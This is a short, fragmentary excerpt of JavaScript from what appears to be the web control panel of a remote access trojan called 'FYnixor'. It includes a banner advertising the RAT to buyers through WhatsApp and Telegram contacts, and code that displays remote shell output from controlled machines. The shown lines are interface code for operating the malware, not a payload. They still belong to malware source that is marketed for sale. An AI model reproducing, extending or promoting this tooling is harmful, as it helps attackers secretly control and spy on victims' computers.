...
pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Open Source RAT named <b style='color:gold'>FYnixor </b>Buyers available <a href='https://wa.me/p/7342621779194949/6283194671693' style='color:#0f8;'>WhatsApp</a>. Resale, Change of Brand Name, Logo of FYnixor is strictly prohibited .";
...
pd1.innerHTML="Want More Features Contact at <a href='https://t.me/Yokoto-saib' style='color:#0f8;'>@Yokoto-saib</a>";
...
$("#shellcmd").css("display","block");
$("#shelldata").html("FYnixor Shell<br><br>"+o.replaceAll("\n","<br>"))
